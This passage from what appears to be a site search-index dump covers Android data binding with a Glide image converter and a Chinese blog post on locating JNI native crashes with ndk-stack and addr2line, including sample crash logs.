Internet, add the permission to use the Internet to your manifest. <uses-permission android:name=\"android.permission.INTERNET\"></uses-permission> To register a custom converter, define the following static method, either in your activity or in a separate class. @BindingAdapter(\"android:src\") public static void setImageUrl(ImageView view, String url) { Glide.with(view.getContext()). load(url). placeholder(R.drawable.ic_listentry). into(view); } Now change your data model. package com.vogella.android.databinding; import android.databinding.BaseObservable; import android.databinding.Bindable; public class TemperatureData extends BaseObservable { private String location; private String celsius; private String url; public TemperatureData(String location, String celsius, String url) { this.location = location; this.celsius = celsius; this.url = url; } @Bindable public String getCelsius() { return celsius; } @Bindable public String getLocation() { return location; } @Bindable public String getUrl() { return url; } public void setLocation(String location) { this.location = location; notifyPropertyChanged(BR.location); } public void setCelsius(String celsius) { this.celsius = celsius; notifyPropertyChanged(BR.celsius); } public void setUrl(String url) { this.url = url; notifyPropertyChanged(BR.url); } } Also adjust the construction of the data model elements. For example, for the list. List<TemperatureData> items = Arrays.asList( new TemperatureData(\"Hamburg\", \"5\", \"http://lorempixel.com/40/40/\"), new TemperatureData(\"Berlin\", \"6\",\"http://lorempixel.com/40/40/\")); Adjust the android.src attribute in your rowlayout.xml . <layout xmlns:android=\"http://schemas.android.com/apk/res/android\"> <data> <variable name=\"obj\" type=\"com.vogella.android.databinding.TemperatureData\" /> </data> <RelativeLayout android:layout_width=\"fill_parent\" android:layout_height=\"?android:attr/listPreferredItemHeight\" android:padding=\"6dip\" > <ImageView android:id=\"@+id/icon\" android:layout_width=\"wrap_content\" android:layout_height=\"fill_parent\" android:layout_alignParentBottom=\"true\" android:layout_alignParentTop=\"true\" android:layout_marginRight=\"6dip\" android:contentDescription=\"TODO\" android:src=\"@{obj.url}\" /> <TextView android:id=\"@+id/secondLine\" android:layout_width=\"fill_parent\" android:layout_height=\"26dip\" android:layout_alignParentBottom=\"true\" android:layout_alignParentRight=\"true\" android:layout_toRightOf=\"@id/icon\" android:ellipsize=\"marquee\" android:text=\"@{obj.location}\" android:textSize=\"12sp\" android:maxLines=\"1\" /> <TextView android:id=\"@+id/firstLine\" android:layout_width=\"fill_parent\" android:layout_height=\"wrap_content\" android:layout_above=\"@id/secondLine\" android:layout_alignParentRight=\"true\" android:layout_alignParentTop=\"true\" android:layout_alignWithParentIfMissing=\"true\" android:layout_toRightOf=\"@id/icon\" android:gravity=\"center_vertical\" android:text=\"@{obj.celsius}\" android:textSize=\"16sp\" /> </RelativeLayout> </layout> googletag.cmd.push(function() { googletag.display('ad-afterResources'); });","title":"3.8. Optional exercise: Use a custom converter"},{"location":"Android/Using%20data%20binding%20in%20Android/#4-android-databinding-resources","text":"Androids Data Binding Library Blog about about custom setters in Data binding George Mount about Data Binding and RecyclerView Dynamic view generation with Data Binding Video introduction into Data Binding \u539f\u6587\u94fe\u63a5\uff1a https://www.vogella.com/tutorials/AndroidDatabinding/article.html","title":"4. Android databinding resources"},{"location":"Android/android%E4%BD%BF%E7%94%A8ndk-stack%E8%B0%83%E8%AF%95JNI%E9%83%A8%E5%88%86%E7%9A%84C_C%2B%2B%E4%BB%A3%E7%A0%81/","text":"android\u4f7f\u7528ndk-stack\u8c03\u8bd5JNI\u90e8\u5206\u7684C/C++\u4ee3\u7801 \u6cd5\u4e00\uff1a\u4f7f\u7528ndk-stack\u8f93\u51fa\u8c03\u7528\u5806\u6808 \u6211\u8fd9\u91cc\u7684ndk-stack\u4f4d\u7f6e\u4e3a\uff1a/home/hwh/Android_Project/Environment/android-ndk-r8e 'ndk-stack' \u662f\u4e00\u4e2a\u5de5\u5177\uff0c\u53ef\u4ee5\u5c06.so\u6587\u4ef6\u7684\u5730\u5740\u6620\u5c04\u5230\u76f8\u5e94\u7684\u7f16\u8bd1\u6b64.so\u6587\u4ef6\u7684.h/.cpp\u7684\u5177\u4f53\u5730\u5740. \u4e3e\u4f8b\uff1a \u6211\u8fd9\u91cc\u67092\u4e2a\u6587\u4ef6SampleJNIBinder.h\u548cSampleJNIBinder.cpp\uff0c\u7f16\u8bd1\u540e\u751f\u6210libSampleJNIBinder.so\u8fd9\u4e2a\u52a8\u6001\u5e93\u3002 \u8c03\u7528\u6b64.so\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u51fa\u73b0\u4e86\u5982\u4e0b\u7684\u9519\u8bef\u3002 F/libc ( 1783): Fatal signal 11 (SIGSEGV) at 0x00000000 (code=1) I/DEBUG ( 115): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** I/DEBUG ( 115): Build fingerprint: 'intel/mfld_dv10/mfld_dv10:4.0.4/IMM76D/release.20130301:eng/dev-keys' I/DEBUG ( 115): pid: 1783, tid: 1783 >>> com.example.apis <<< I/DEBUG ( 115): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000 I/DEBUG ( 115): eax bfb0eb4e ebx 5e35753c ecx 00000000 edx 5f200019 I/DEBUG ( 115): esi bfb0eb48 edi 08b20db0 I/DEBUG ( 115): xcs 00000073 xds 0000007b xes 0000007b xfs 00000000 xss 0000007b I/DEBUG ( 115): eip 5e35464a ebp bfb0eb98 esp bfb0eb30 flags 00010206 **I/DEBUG ( 115): #00 eip: 0000264a /data/data/com.example.apis/lib/libSampleJNIBinder.so** I/DEBUG ( 115): #01 eip: 0007a959 /system/lib/libdvm.so (_Z16dvmCallJNIMethodPKjP6JValuePK6MethodP6Thread+0x1e9) \u7ea2\u8272\u90e8\u5206\u7684\u4ee3\u7801\u662f\u9519\u8bef\u7684\u4f4d\u7f6e\uff0c\u5bf9\u4e8eeip\u8fd9\u4e2a\u5bc4\u5b58\u5668\u91cc\u9762\u7684\u503c\uff1a0000264a\uff0c\u6211\u4eec\u627e\u4e0d\u5230\u4efb\u4f55\u7ebf\u7d22\u3002 \u4f46\u662f\u53ef\u4ee5\u901a\u8fc7'adb logcat > foo.txt' \u5c06\u9519\u8bef\u4fe1\u606f\u5bfc\u51fa\u5230\u5f53\u524d\u76ee\u5f55\u7684foo.txt\u6587\u4ef6\u4e2d\u3002 \u7136\u540e\u901a\u8fc7\uff1a ./ndk-stack -sym /home/<user-name>/workspace_android/HHDemos/obj/local/x86 -dump foo.txt \u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u89e3\u6790 \u8fd9\u6837\u8fd4\u56de\u7684\u7ed3\u679c\u4e3a\uff1a huanghao@Mtn:~/Projects/AndroidNDK$ ./ndk-stack -sym /home/huanghao/workspace_android/HHDemos/obj/local/x86 -dump foo.txt ********** Crash dump: ********** Build fingerprint: 'intel/mfld_dv10/mfld_dv10:4.0.4/IMM76D/release.20130301:eng/dev-keys' pid: 2319, tid: 2319 >>> com.example.apis <<< signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000 **Stack frame #00 eip: 0000264a /data/data/com.example.apis/lib/libSampleJNIBinder.so: Routine Java_com_example_apis_JNI_SampleJNIBinder_JTCGetStringFromJNI in /home/huanghao/workspace_android/HHDemos/jni/SampleJNIBinder/SampleJNIBinder.cpp:35** Stack frame #01 eip: 0007a959 /system/lib/libdvm.so (_Z16dvmCallJNIMethodPKjP6JValuePK6MethodP6Thread+0x1e9) Stack frame #02 eip: 00063ba1 /system/lib/libdvm.so (_Z21dvmCheckCallJNIMethodPKjP6JValuePK6MethodP6Thread+0x41) Stack frame #03 eip: 00085d2d /system/lib/libdvm.so (_Z22dvmResolveNativeMethodPKjP6JValuePK6MethodP6Thread+0x13d) Stack frame #04 eip: 00125d34 /system/lib/libdvm.so Stack frame #05 eip: 0003f466 /system/lib/libdvm.so (_Z11dvmMterpStdP6Thread+0x46) Stack frame #06 eip: 0003bb06 /system/lib/libdvm.so (_Z12dvmInterpretP6ThreadPK6MethodP6JValue+0xd6) Stack frame #07 eip: 000a81fa /system/lib/libdvm.so (_Z15dvmInvokeMethodP6ObjectPK6MethodP11ArrayObjectS5_P11ClassObjectb+0x51a) \u8fd9\u91cc\u6211\u4eec\u5f88\u5bb9\u6613\u770b\u51faSampleJNIBinder.cpp:35\u6709\u9519\u8bef\uff0c\u90a3\u4e48\u6211\u4eec\u627e\u5230\u90a3\u90e8\u5206\u7684\u4ee3\u7801\uff1a \u5982\u4e0b JNIEXPORT jstring JNICALL Java_com_example_apis_JNI_SampleJNIBinder_JTCGetStringFromJNI(JNIEnv *env, jobject thiz) { int * p = NULL; *p = 100; //\u8fd9\u91cc\u662f35\u884c int n1 = true; int n2 = false; LogPrintf(\"jni-hh\", \"n1: %d, n2: %d\", n1, n2); \u8fd9\u91cc\u662f\u4e00\u4e2a\u7ed9\u7a7a\u6307\u9488\u8d4b\u503c\u7684\u9519\u8bef\uff0c\u5f88\u7b80\u5355\u5427\u3002 \u597d\u4e86\uff0c\u9700\u8981\u603b\u7ed3\u4e00\u4e0b\u3002 \u4f7f\u7528'ndk-stack'\u67e5\u770bbackstack\u4fe1\u606f\u7684\u6b65\u9aa4\u5982\u4e0b\uff1a 1. \u8fdb\u5165Android-NDK\u7684\u8def\u5f84 \u6211\u8fd9\u91cc\u4e3a\uff1a/home/<user-name>/Projects/AndroidNDK $ cd /home/<user-name>/Projects/AndroidNDK 2.\u5bfc\u51falogcat\u4fe1\u606f\u5230foo.txt\u4e2d $ adb logcat > foo.txt 3.\u901a\u8fc7GPF\u7684\u5730\u5740\u548c.so\u6587\u4ef6 \u83b7\u53d6\u5b9e\u9645\u5728.cpp\u6587\u4ef6\u9519\u8bef\u7684\u5730\u5740 \u4f8b\u5b50\uff1a<user-name>@Mtn:~/Projects/AndroidNDK$ ./ndk-stack -sym <.so\u6587\u4ef6\u76ee\u5f55> -dump foo.txt \u6211\u7684\u7528\u6cd5\uff1a <user-name>@Mtn:~/Projects/AndroidNDK$ ./ndk-stack -sym /home/<user-name>/workspace_android/HHDemos/obj/local/x86 -dump foo.txt \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u4e0a\u97622\u53e5\u5408\u5e76\u6210\u4e00\u53e5\uff1a \u5982\u4e0b\uff1a $ adb logcat | $NDK_HOME/ndk-stack -sym /home/hwh/Android_Project/Code/HHDemos/obj/local/x86 \u6ce8\u610f\uff1a \u6b64\u65f6\u6211\u4eec\u7684\u64cd\u4f5c\u8def\u5f84\u662fAndroidSDK\u76ee\u5f55, foo.txt\u4e5f\u5728\u8be5\u76ee\u5f55\u3002 2.\u4e0a\u9762\u7684x86\u662f\u4f60\u5e73\u677f\u7684CPU\u51b3\u5b9a\u4e86\uff0c\u5982\u679c\u4f60\u7684\u5e73\u677f\u662fARM\u7684CPU\u90a3\u4e48\u5e94\u8be5\u6539\u4e3a\uff1aarmeabi\u4e86\u3002 \u4f46\u662f\u6211\u516c\u53f8\u540c\u4e8b\u7684\u673a\u5b50adb logcat\u597d\u50cf\u81ea\u52a8\u5c31\u5c06\u9519\u8bef\u7684\u5730\u5740\u8f6c\u6362\u4e3a.cpp\u6587\u4ef6\u4e2d\u7684\u5730\u5740\uff0c\u53ef\u80fd\u9700\u8981\u5177\u4f53\u914d\u7f6e\u3002 \u6682\u65f6\u4e0d\u6e05\u695a\uff0c\u6211\u5f04\u597d\u4e86\u7684\u8bdd\u5c31\u5728\u8fd9\u91cc\u6dfb\u52a0\u3002\u3002\u3002\u3002\u3002\uff1b \u6cd5\u4e8c\uff1a\u4f7f\u7528i686-linux-android-addr2line\u8f93\u51fa\u8c03\u8bd5\u4fe1\u606f \u4e0b\u9762\u662f\u8be5\u6587\u4ef6\u7684\u8def\u5f84 /home/hwh/Android_Project/Environment/android-ndk-r8e/toolchains/x86-4.6/prebuilt/linux-x86/bin \u5176\u4e2dandroid-ndk-r8e\u662f\u6211\u5728ndk\u5b98\u7f51\u4e0b\u8f7d\u7684android-ndk-r8e-linux-x86.tar.bz2\u89e3\u538b\u7f29\u540e\u7684\u6587\u4ef6\u5939\u3002 \u7528\u6cd5\uff1a $ ./i686-linux-android-addr2line -f -e /home/hwh/Android_Project/Code/HHDemos/obj/local/x86/libSampleJNIBinder.so 0000415C \u603b\u7ed3\u4e00\u4e0b\u5c31\u662f\uff1a $ ./i686-linux-android-addr2line -f -e <.so\u6587\u4ef6\u7684pathName> <\u51fa\u9519\u7684\u5730\u5740> \u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a hwh@Mountain:~/Android_Project/Environment/android-ndk-r8e/toolchains/x86-4.6/prebuilt/linux-x86/bin$ ./i686-linux-android-addr2line -f -e /home/hwh/Android_Project/Code/HHDemos/obj/local/x86/libSampleJNIBinder.so 0000415C Java_com_example_apis_JNI_SampleJNIBinder_JTCGetStringFromJNI /home/hwh/Android_Project/Code/HHDemos/jni/SampleJNIBinder/SampleJNIBinder.cpp:35 i686-linux-android-addr2line \u8fd4\u56de\u7684\u4fe1\u606f\u4e3a\uff1a \u51fa\u9519\u7684\u51fd\u6570 \u51fa\u9519\u5730\u70b9\u5728\u8be5.cpp\u6587\u4ef6\u7684\u884c\u6570 Android ndk-stack tool Introduction: ------------- This document describes the 'ndk-stack' tool that is distributed withthe Android NDK, since release r6. Overview: --------- 'ndk-stack' is a simple tool that allows you to filter stack traces as theyappear in the output of 'adb logcat' and replace any address inside a shared library with the corresponding : values. In a nutshell, it will translate something like: I/DEBUG ( 31): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** I/DEBUG ( 31): Build fingerprint: 'generic/google_sdk/generic/:2.2/FRF91/43546:eng/test-keys' I/DEBUG ( 31): pid: 351, tid: 351 %gt;%gt;%gt; /data/local/ndk-tests/crasher <<< I/DEBUG ( 31): signal 11 (SIGSEGV), fault addr 0d9f00d8 I/DEBUG ( 31): r0 0000af88 r1 0000a008 r2 baadf00d r3 0d9f00d8 I/DEBUG ( 31): r4 00000004 r5 0000a008 r6 0000af88 r7 00013c44 I/DEBUG ( 31): r8 00000000 r9 00000000 10 00000000 fp 00000000 I/DEBUG ( 31): ip 0000959c sp be956cc8 lr 00008403 pc 0000841e cpsr 60000030 I/DEBUG ( 31): #00 pc 0000841e /data/local/ndk-tests/crasher I/DEBUG ( 31): #01 pc 000083fe /data/local/ndk-tests/crasher I/DEBUG ( 31): #02 pc 000083f6 /data/local/ndk-tests/crasher I/DEBUG ( 31): #03 pc 000191ac /system/lib/libc.so I/DEBUG ( 31): #04 pc 000083ea /data/local/ndk-tests/crasher I/DEBUG ( 31): #05 pc 00008458 /data/local/ndk-tests/crasher I/DEBUG ( 31): #06 pc 0000d362 /system/lib/libc.so I/DEBUG ( 31): Into the more readable output: ********** Crash dump: ********** Build fingerprint: 'generic/google_sdk/generic/:2.2/FRF91/43546:eng/test-keys' pid: 351, tid: 351 >>> /data/local/ndk-tests/crasher <<< signal 11 (SIGSEGV), fault addr 0d9f00d8 Stack frame #00 pc 0000841e /data/local/ndk-tests/crasher : Routine zoo in /tmp/foo/crasher/jni/zoo.c:13 Stack frame #01 pc 000083fe /data/local/ndk-tests/crasher : Routine bar in /tmp/foo/crasher/jni/bar.c:5 Stack frame #02 pc 000083f6 /data/local/ndk-tests/crasher : Routine my_comparison in /tmp/foo/crasher/jni/foo.c:9 Stack frame #03 pc 000191ac /system/lib/libc.so Stack frame #04 pc 000083ea /data/local/ndk-tests/crasher : Routine foo in /tmp/foo/crasher/jni/foo.c:14 Stack frame #05 pc 00008458 /data/local/ndk-tests/crasher : Routine main in /tmp/foo/crasher/jni/main.c:19 Stack frame #06 pc 0000d362 /system/lib/libc.so Usage: ------ To do this, you will first need a directory containing symbolic versions of yourapplication's shared libraries. If you use the NDK build system (i.e. ndk-build), then these are always located under $PROJECT_PATH/obj/local/<ab>, where<ab> stands for your device's ABI (i.e. 'armeabi' by default). You can feed the logcat text either as direct input to the program, e.g.: adb logcat | $NDK/ndk-stack -sym $PROJECT_PATH/obj/local/armeabi Or you can use the -dump option to specify the logcat as an input file, e.g.: adb logcat > /tmp/foo.txt $NDK/ndk-stack -sym $PROJECT_PATH/obj/local/armeabi -dump foo.txt TODO: ----- A future version of 'ndk-stack' will try to launch 'adb logcat' and select thelibrary path automatically. For now, you'll have to do these steps manually. As of now, ndk-stack doesn't handle libraries that don't have debug informationin them. It may be useful to try to detect the nearest function entry point to a given PC address (e.g. as in the libc.so example above). \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/oldmtn/article/details/8889654","title":"android\u4f7f\u7528ndk stack\u8c03\u8bd5JNI\u90e8\u5206\u7684C C++\u4ee3\u7801"},{"location":"Android/android%E4%BD%BF%E7%94%A8ndk-stack%E8%B0%83%E8%AF%95JNI%E9%83%A8%E5%88%86%E7%9A%84C_C%2B%2B%E4%BB%A3%E7%A0%81/#androidndk-stackjnicc","text":"","title":"android\u4f7f\u7528ndk-stack\u8c03\u8bd5JNI\u90e8\u5206\u7684C/C++\u4ee3\u7801"},{"location":"Android/android%E4%BD%BF%E7%94%A8ndk-stack%E8%B0%83%E8%AF%95JNI%E9%83%A8%E5%88%86%E7%9A%84C_C%2B%2B%E4%BB%A3%E7%A0%81/#ndk-stack","text":"\u6211\u8fd9\u91cc\u7684ndk-stack\u4f4d\u7f6e\u4e3a\uff1a/home/hwh/Android_Project/Environment/android-ndk-r8e 'ndk-stack' \u662f\u4e00\u4e2a\u5de5\u5177\uff0c\u53ef\u4ee5\u5c06.so\u6587\u4ef6\u7684\u5730\u5740\u6620\u5c04\u5230\u76f8\u5e94\u7684\u7f16\u8bd1\u6b64.so\u6587\u4ef6\u7684.h/.cpp\u7684\u5177\u4f53\u5730\u5740. \u4e3e\u4f8b\uff1a \u6211\u8fd9\u91cc\u67092\u4e2a\u6587\u4ef6SampleJNIBinder.h\u548cSampleJNIBinder.cpp\uff0c\u7f16\u8bd1\u540e\u751f\u6210libSampleJNIBinder.so\u8fd9\u4e2a\u52a8\u6001\u5e93\u3002 \u8c03\u7528\u6b64.so\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u51fa\u73b0\u4e86\u5982\u4e0b\u7684\u9519\u8bef\u3002 F/libc ( 1783): Fatal signal 11 (SIGSEGV) at 0x00000000 (code=1) I/DEBUG ( 115): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** I/DEBUG ( 115): Build fingerprint: 'intel/mfld_dv10/mfld_dv10:4.0.4/IMM76D/release.20130301:eng/dev-keys' I/DEBUG ( 115): pid: 1783, tid: 1783 >>> com.example.apis <<< I/DEBUG ( 115): signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000 I/DEBUG ( 115): eax bfb0eb4e ebx 5e35753c ecx 00000000 edx 5f200019 I/DEBUG ( 115): esi bfb0eb48 edi 08b20db0 I/DEBUG ( 115): xcs 00000073 xds 0000007b xes 0000007b xfs 00000000 xss 0000007b I/DEBUG ( 115): eip 5e35464a ebp bfb0eb98 esp bfb0eb30 flags 00010206 **I/DEBUG ( 115): #00 eip: 0000264a /data/data/com.example.apis/lib/libSampleJNIBinder.so** I/DEBUG ( 115): #01 eip: 0007a959 /system/lib/libdvm.so (_Z16dvmCallJNIMethodPKjP6JValuePK6MethodP6Thread+0x1e9) \u7ea2\u8272\u90e8\u5206\u7684\u4ee3\u7801\u662f\u9519\u8bef\u7684\u4f4d\u7f6e\uff0c\u5bf9\u4e8eeip\u8fd9\u4e2a\u5bc4\u5b58\u5668\u91cc\u9762\u7684\u503c\uff1a0000264a\uff0c\u6211\u4eec\u627e\u4e0d\u5230\u4efb\u4f55\u7ebf\u7d22\u3002 \u4f46\u662f\u53ef\u4ee5\u901a\u8fc7'adb logcat > foo.txt' \u5c06\u9519\u8bef\u4fe1\u606f\u5bfc\u51fa\u5230\u5f53\u524d\u76ee\u5f55\u7684foo.txt\u6587\u4ef6\u4e2d\u3002 \u7136\u540e\u901a\u8fc7\uff1a ./ndk-stack -sym /home/<user-name>/workspace_android/HHDemos/obj/local/x86 -dump foo.txt \u8fd9\u4e2a\u547d\u4ee4\u53ef\u4ee5\u89e3\u6790 \u8fd9\u6837\u8fd4\u56de\u7684\u7ed3\u679c\u4e3a\uff1a huanghao@Mtn:~/Projects/AndroidNDK$ ./ndk-stack -sym /home/huanghao/workspace_android/HHDemos/obj/local/x86 -dump foo.txt ********** Crash dump: ********** Build fingerprint: 'intel/mfld_dv10/mfld_dv10:4.0.4/IMM76D/release.20130301:eng/dev-keys' pid: 2319, tid: 2319 >>> com.example.apis <<< signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 00000000 **Stack frame #00 eip: 0000264a /data/data/com.example.apis/lib/libSampleJNIBinder.so: Routine Java_com_example_apis_JNI_SampleJNIBinder_JTCGetStringFromJNI in /home/huanghao/workspace_android/HHDemos/jni/SampleJNIBinder/SampleJNIBinder.cpp:35** Stack frame #01 eip: 0007a959 /system/lib/libdvm.so (_Z16dvmCallJNIMethodPKjP6JValuePK6MethodP6Thread+0x1e9) Stack frame #02 eip: 00063ba1 /system/lib/libdvm.so (_Z21dvmCheckCallJNIMethodPKjP6JValuePK6MethodP6Thread+0x41) Stack frame #03 eip: 00085d2d /system/lib/libdvm.so (_Z22dvmResolveNativeMethodPKjP6JValuePK6MethodP6Thread+0x13d) Stack frame #04 eip: 00125d34 /system/lib/libdvm.so Stack frame #05 eip: 0003f466 /system/lib/libdvm.so (_Z11dvmMterpStdP6Thread+0x46) Stack frame #06 eip: 0003bb06 /system/lib/libdvm.so (_Z12dvmInterpretP6ThreadPK6MethodP6JValue+0xd6) Stack frame #07 eip: 000a81fa /system/lib/libdvm.so (_Z15dvmInvokeMethodP6ObjectPK6MethodP11ArrayObjectS5_P11ClassObjectb+0x51a) \u8fd9\u91cc\u6211\u4eec\u5f88\u5bb9\u6613\u770b\u51faSampleJNIBinder.cpp:35\u6709\u9519\u8bef\uff0c\u90a3\u4e48\u6211\u4eec\u627e\u5230\u90a3\u90e8\u5206\u7684\u4ee3\u7801\uff1a \u5982\u4e0b JNIEXPORT jstring JNICALL Java_com_example_apis_JNI_SampleJNIBinder_JTCGetStringFromJNI(JNIEnv *env, jobject thiz) { int * p = NULL; *p = 100; //\u8fd9\u91cc\u662f35\u884c int n1 = true; int n2 = false; LogPrintf(\"jni-hh\", \"n1: %d, n2: %d\", n1, n2); \u8fd9\u91cc\u662f\u4e00\u4e2a\u7ed9\u7a7a\u6307\u9488\u8d4b\u503c\u7684\u9519\u8bef\uff0c\u5f88\u7b80\u5355\u5427\u3002 \u597d\u4e86\uff0c\u9700\u8981\u603b\u7ed3\u4e00\u4e0b\u3002 \u4f7f\u7528'ndk-stack'\u67e5\u770bbackstack\u4fe1\u606f\u7684\u6b65\u9aa4\u5982\u4e0b\uff1a 1. \u8fdb\u5165Android-NDK\u7684\u8def\u5f84 \u6211\u8fd9\u91cc\u4e3a\uff1a/home/<user-name>/Projects/AndroidNDK $ cd /home/<user-name>/Projects/AndroidNDK 2.\u5bfc\u51falogcat\u4fe1\u606f\u5230foo.txt\u4e2d $ adb logcat > foo.txt 3.\u901a\u8fc7GPF\u7684\u5730\u5740\u548c.so\u6587\u4ef6 \u83b7\u53d6\u5b9e\u9645\u5728.cpp\u6587\u4ef6\u9519\u8bef\u7684\u5730\u5740 \u4f8b\u5b50\uff1a<user-name>@Mtn:~/Projects/AndroidNDK$ ./ndk-stack -sym <.so\u6587\u4ef6\u76ee\u5f55> -dump foo.txt \u6211\u7684\u7528\u6cd5\uff1a <user-name>@Mtn:~/Projects/AndroidNDK$ ./ndk-stack -sym /home/<user-name>/workspace_android/HHDemos/obj/local/x86 -dump foo.txt \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c06\u4e0a\u97622\u53e5\u5408\u5e76\u6210\u4e00\u53e5\uff1a \u5982\u4e0b\uff1a $ adb logcat | $NDK_HOME/ndk-stack -sym /home/hwh/Android_Project/Code/HHDemos/obj/local/x86 \u6ce8\u610f\uff1a \u6b64\u65f6\u6211\u4eec\u7684\u64cd\u4f5c\u8def\u5f84\u662fAndroidSDK\u76ee\u5f55, foo.txt\u4e5f\u5728\u8be5\u76ee\u5f55\u3002 2.\u4e0a\u9762\u7684x86\u662f\u4f60\u5e73\u677f\u7684CPU\u51b3\u5b9a\u4e86\uff0c\u5982\u679c\u4f60\u7684\u5e73\u677f\u662fARM\u7684CPU\u90a3\u4e48\u5e94\u8be5\u6539\u4e3a\uff1aarmeabi\u4e86\u3002 \u4f46\u662f\u6211\u516c\u53f8\u540c\u4e8b\u7684\u673a\u5b50adb logcat\u597d\u50cf\u81ea\u52a8\u5c31\u5c06\u9519\u8bef\u7684\u5730\u5740\u8f6c\u6362\u4e3a.cpp\u6587\u4ef6\u4e2d\u7684\u5730\u5740\uff0c\u53ef\u80fd\u9700\u8981\u5177\u4f53\u914d\u7f6e\u3002 \u6682\u65f6\u4e0d\u6e05\u695a\uff0c\u6211\u5f04\u597d\u4e86\u7684\u8bdd\u5c31\u5728\u8fd9\u91cc\u6dfb\u52a0\u3002\u3002\u3002\u3002\u3002\uff1b","title":"\u6cd5\u4e00\uff1a\u4f7f\u7528ndk-stack\u8f93\u51fa\u8c03\u7528\u5806\u6808"},{"location":"Android/android%E4%BD%BF%E7%94%A8ndk-stack%E8%B0%83%E8%AF%95JNI%E9%83%A8%E5%88%86%E7%9A%84C_C%2B%2B%E4%BB%A3%E7%A0%81/#i686-linux-android-addr2line","text":"\u4e0b\u9762\u662f\u8be5\u6587\u4ef6\u7684\u8def\u5f84 /home/hwh/Android_Project/Environment/android-ndk-r8e/toolchains/x86-4.6/prebuilt/linux-x86/bin \u5176\u4e2dandroid-ndk-r8e\u662f\u6211\u5728ndk\u5b98\u7f51\u4e0b\u8f7d\u7684android-ndk-r8e-linux-x86.tar.bz2\u89e3\u538b\u7f29\u540e\u7684\u6587\u4ef6\u5939\u3002 \u7528\u6cd5\uff1a $ ./i686-linux-android-addr2line -f -e /home/hwh/Android_Project/Code/HHDemos/obj/local/x86/libSampleJNIBinder.so 0000415C \u603b\u7ed3\u4e00\u4e0b\u5c31\u662f\uff1a $ ./i686-linux-android-addr2line -f -e <.so\u6587\u4ef6\u7684pathName> <\u51fa\u9519\u7684\u5730\u5740> \u8f93\u51fa\u7ed3\u679c\u4e3a\uff1a hwh@Mountain:~/Android_Project/Environment/android-ndk-r8e/toolchains/x86-4.6/prebuilt/linux-x86/bin$ ./i686-linux-android-addr2line -f -e /home/hwh/Android_Project/Code/HHDemos/obj/local/x86/libSampleJNIBinder.so 0000415C Java_com_example_apis_JNI_SampleJNIBinder_JTCGetStringFromJNI /home/hwh/Android_Project/Code/HHDemos/jni/SampleJNIBinder/SampleJNIBinder.cpp:35 i686-linux-android-addr2line \u8fd4\u56de\u7684\u4fe1\u606f\u4e3a\uff1a \u51fa\u9519\u7684\u51fd\u6570 \u51fa\u9519\u5730\u70b9\u5728\u8be5.cpp\u6587\u4ef6\u7684\u884c\u6570","title":"\u6cd5\u4e8c\uff1a\u4f7f\u7528i686-linux-android-addr2line\u8f93\u51fa\u8c03\u8bd5\u4fe1\u606f"},{"location":"Android/android%E4%BD%BF%E7%94%A8ndk-stack%E8%B0%83%E8%AF%95JNI%E9%83%A8%E5%88%86%E7%9A%84C_C%2B%2B%E4%BB%A3%E7%A0%81/#android-ndk-stack-tool","text":"Introduction: ------------- This document describes the 'ndk-stack' tool that is distributed withthe Android NDK, since release r6. Overview: --------- 'ndk-stack' is a simple tool that allows you to filter stack traces as theyappear in the output of 'adb logcat' and replace any address inside a shared library with the corresponding : values. In a nutshell, it will translate something like: I/DEBUG ( 31): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** I/DEBUG ( 31): Build fingerprint: 'generic/google_sdk/generic/:2.2/FRF91/43546:eng/test-keys' I/DEBUG ( 31): pid: 351, tid: 351 %gt;%gt;%gt; /data/local/ndk-tests/crasher <<< I/DEBUG ( 31): signal 11 (SIGSEGV), fault addr 0d9f00d8 I/DEBUG ( 31): r0 0000af88 r1 0000a008 r2 baadf00d r3 0d9f00d8 I/DEBUG ( 31): r4 00000004 r5 0000a008 r6 0000af88 r7 00013c44 I/DEBUG ( 31): r8 00000000 r9 00000000 10 00000000 fp 00000000 I/DEBUG ( 31): ip 0000959c sp be956cc8 lr 00008403 pc 0000841e cpsr 60000030 I/DEBUG ( 31): #00 pc 0000841e /data/local/ndk-tests/crasher I/DEBUG ( 31): #01 pc 000083fe /data/local/ndk-tests/crasher I/DEBUG ( 31): #02 pc 000083f6 /data/local/ndk-tests/crasher I/DEBUG ( 31): #03 pc 000191ac /system/lib/libc.so I/DEBUG ( 31): #04 pc 000083ea /data/local/ndk-tests/crasher I/DEBUG ( 31): #05 pc 00008458 /data/local/ndk-tests/crasher I/DEBUG ( 31): #06 pc 0000d362 /system/lib/libc.so I/DEBUG ( 31): Into the more readable output: ********** Crash dump: ********** Build fingerprint: 'generic/google_sdk/generic/:2.2/FRF91/43546:eng/test-keys' pid: 351, tid: 351 >>> /data/local/ndk-tests/crasher <<< signal 11 (SIGSEGV), fault addr 0d9f00d8 Stack frame #00 pc 0000841e /data/local/ndk-tests/crasher : Routine zoo in /tmp/foo/crasher/jni/zoo.c:13 Stack frame #01 pc 000083fe /data/local/ndk-tests/crasher : Routine bar in /tmp/foo/crasher/jni/bar.c:5 Stack frame #02 pc 000083f6 /data/local/ndk-tests/crasher : Routine my_comparison in /tmp/foo/crasher/jni/foo.c:9 Stack frame #03 pc 000191ac /system/lib/libc.so Stack frame #04 pc 000083ea /data/local/ndk-tests/crasher : Routine foo in /tmp/foo/crasher/jni/foo.c:14 Stack frame #05 pc 00008458 /data/local/ndk-tests/crasher : Routine main in /tmp/foo/crasher/jni/main.c:19 Stack frame #06 pc 0000d362 /system/lib/libc.so Usage: ------ To do this, you will first need a directory containing symbolic versions of yourapplication's shared libraries. If you use the NDK build system (i.e. ndk-build), then these are always located under $PROJECT_PATH/obj/local/<ab>, where<ab> stands for your device's ABI (i.e. 